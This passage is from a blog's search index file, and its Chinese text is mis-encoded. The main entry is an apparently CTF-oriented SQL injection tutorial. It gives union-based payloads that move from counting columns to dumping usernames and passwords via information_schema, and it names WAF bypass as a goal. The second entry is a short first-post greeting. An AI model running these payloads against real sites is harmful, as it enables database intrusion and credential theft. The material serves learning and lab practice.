class="line">é¦–å…ˆçŸ¥é“è¡¨æ ¼æœ‰å‡ åˆ—:?id=1&#x27;order by 3 --+</span><br><span class="line">çˆ†å‡ºæ˜¾ç¤ºä½:?id=-1&#x27;union select 1,2,3--+</span><br><span class="line">è·å–å½“å‰æ•°æ®åå’Œç‰ˆæœ¬å·:?id=-1&#x27;union select 1,database(),version()--+ //çˆ†åº“åã€çœ‹æ˜¾ä½</span><br><span class="line">å› ä¸ºåªæœ‰ä¸‰åˆ—ï¼Œæ‰€ä»¥è¿™é‡Œ select 1,2,3åªèƒ½æœ‰ä¸‰ä¸ªæ•°</span><br></pre></td></tr></table></figure><p><code>order by 4</code>åˆ°4æ—¶å€™ä¼šæŠ¥é”™ï¼Œè¯´æ˜åªæœ‰ä¸‰åˆ—</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212017456.png"></p><h4 id="å››ã€ç„¶åæ•°æ®åº“å"><a href="#å››ã€ç„¶åæ•°æ®åº“å" class="headerlink" title="å››ã€ç„¶åæ•°æ®åº“å"></a><strong>å››ã€ç„¶åæ•°æ®åº“å</strong></h4><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212018797.png"></p><h4 id="äº”ã€çˆ†è¡¨å"><a href="#äº”ã€çˆ†è¡¨å" class="headerlink" title="äº”ã€çˆ†è¡¨å"></a><strong>äº”ã€çˆ†è¡¨å</strong></h4><p>çˆ†è¡¨åäº†è¯æˆ‘ä»¬å°±è¦çŸ¥é“ä¸€ä¸ªä¸œè¥¿,å«<code>information_schema</code></p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212018261.png" alt="image-20241021182541636"></p><p><code>information_schema</code> åœ¨ MySQL 5.0 ç‰ˆæœ¬ä¸­å¼•å…¥ï¼Œé‡Œé¢åŒ…æ‹¬</p><table><thead><tr><th><strong>TABLES</strong></th><th>æä¾›å…³äºæ•°æ®åº“ä¸­æ‰€æœ‰è¡¨çš„ä¿¡æ¯</th></tr></thead><tbody><tr><td><strong>COLUMNS</strong></td><td><strong>æä¾›å…³äºè¡¨çš„åˆ—ä¿¡æ¯</strong></td></tr><tr><td><strong>SCHEMATA</strong></td><td><strong>åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“ï¼ˆschemaï¼‰çš„åç§°</strong></td></tr></tbody></table><p>ç­‰ç­‰</p><p>æˆ‘ä»¬æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=&#x27;security&#x27;%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212019360.png"></p><p>çˆ†å‡ºäº†è¡¨åäº†ï¼Œå‡å¦‚æ•æ„Ÿä¿¡æ¯åœ¨<code>users</code>è¡¨ä¸‹ï¼Œæˆ‘ä»¬è¦è¿›å…¥<code>users</code>è¡¨è·å–å…¶å­—æ®µå</p><h4 id="å…­ã€çˆ†å­—æ®µå"><a href="#å…­ã€çˆ†å­—æ®µå" class="headerlink" title="å…­ã€çˆ†å­—æ®µå"></a><strong>å…­ã€çˆ†å­—æ®µå</strong></h4><p>åªéœ€è¦ä¿®æ”¹ä¸€ç‚¹åœ°æ–¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,group_concat(column_name)from information_schema.columns where table_name=&#x27;users&#x27;%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212019842.png"></p><p><strong>é€šè¿‡ä¸Šè¿°æ“ä½œå¯ä»¥å¾—åˆ°ä¸¤ä¸ªæ•æ„Ÿå­—æ®µå°±æ˜¯usernameå’Œpassword,æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦å¾—åˆ°è¯¥å­—æ®µå¯¹åº”çš„å†…å®¹ã€‚æˆ‘è‡ªå·±åŠ äº†ä¸€ä¸ªidå¯ä»¥éš”ä¸€ä¸‹è´¦æˆ·å’Œå¯†ç </strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username ,id , password) from users%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212020794.png"></p><p>è‡³æ­¤ï¼Œä¸€ä¸ªç®€å•çš„sqlæ³¨å…¥å°±å®Œæˆäº†ï¼Œä½†æ˜¯å®é™…ä¸­è‚¯å®šæ²¡æœ‰è¿™ä¹ˆç®€å•ï¼Œä¸ºäº†é˜²èŒƒsqlæ³¨å…¥ä¸€äº›webåº”ç”¨ä¼šåŠ ä¸ŠWAF(web application firewall)ä¼šå¯¹ä½ ä¼ å…¥çš„å‚æ•°è¿›è¡Œåˆ¤æ–­ï¼Œæ˜¯ä¸æ˜¯æœ‰å®³çš„ï¼Œå¦‚æœæ˜¯åˆ™ä¼šæ‹¦æˆªï¼Œå› æ­¤å­¦ä¼šç»•è¿‡wafç­‰æ‰æ˜¯æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„</p>]]></content>
      
      
      <categories>
          
          <category> SQLæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢</title>
      <link href="/2024/10/08/hello-blog/"/>
      <url>/2024/10/08/hello-blog/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Hello-This-is-my-first-articleğŸ¦„"><a href="#Hello-This-is-my-first-articleğŸ¦„" class="headerlink" title="Hello! This is my first articleğŸ¦„"></a>Hello! This is my first articleğŸ¦„</h1><p>æ¬¢è¿æ¥åˆ°æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢ï¼æœ¬åšå®¢æ˜¯ç”±Hexoæ¡†æ¶ï¼ŒButterflyé­”æ”¹è€Œæˆï¼Œå‚è€ƒåšä¸»<img src="https://www.fomal.cc/" alt="Fomalhaut">è¿™ç¯‡æ–‡ç« å°†è®°å½•æˆ‘å¯¹æ—¥å¸¸ç”Ÿæ´»ã€å­¦ä¹ ã€ç¼–ç¨‹ä»¥åŠç½‘ç»œå®‰å…¨çš„ä¸€äº›å¿ƒå¾—å’Œæ€è€ƒã€‚å¸Œæœ›é€šè¿‡å†™åšå®¢çš„æ–¹å¼ï¼Œä¸ä»…èƒ½è®°å½•è‡ªå·±çš„æˆé•¿å†ç¨‹ï¼Œè¿˜èƒ½åˆ†äº«ä¸€äº›æœ‰ä»·å€¼çš„çŸ¥è¯†ç»™å¤§å®¶ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> æ•™ç¨‹ </tag>
            
            <tag> åšå®¢æ­å»º </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
